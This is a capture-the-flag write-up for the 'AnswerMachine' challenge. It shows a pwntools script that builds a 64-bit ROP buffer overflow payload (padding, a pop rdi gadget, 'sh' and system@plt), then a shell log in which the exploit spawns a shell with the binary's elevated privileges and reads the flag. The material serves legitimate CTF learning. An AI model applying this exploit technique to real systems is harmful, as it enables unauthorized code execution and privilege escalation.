### Solved by superkojiman

At some point, the organizers decided to recompile all the binaries into 64-bit since some teams were apparently bruteforcing ASLR. Points were removed for AnswerMachine and rop2libc, so I had to redo those. 

This time, the hint from the last flag informed me that I could've used "sh" from the binary. So here's the new exploit:

```python
#!/usr/bin/env python
from pwn import *

system_addr = p64(0x400640)     # system@plt
binsh_addr = p64(0x400407)      # ptr to "sh"

buf = ""
buf += "A"*88                   # junk
buf += p64(0x0000000000400903)  # pop rdi
buf += binsh_addr
buf += system_addr

open("in.txt", "w").write(buf)
```

And, here, we, go:

```
team24254@shell:~$ (cat in.txt ;cat) | /problems/answer_machine/answer_machine
Welcome, today is Tue Apr 12 22:24:25 EDT 2016
I can't talk now, so leave a message:
Error opening file; message moved to trash
id
uid=1028(team24254) gid=1000(ctfgroup) euid=1081(answer_machine) groups=1004(answer_machine),1000(ctfgroup)
cat /problems/answer_machine/flag.txt
coulda_just_used_strftime_instead_amirite
```

Ta-da.
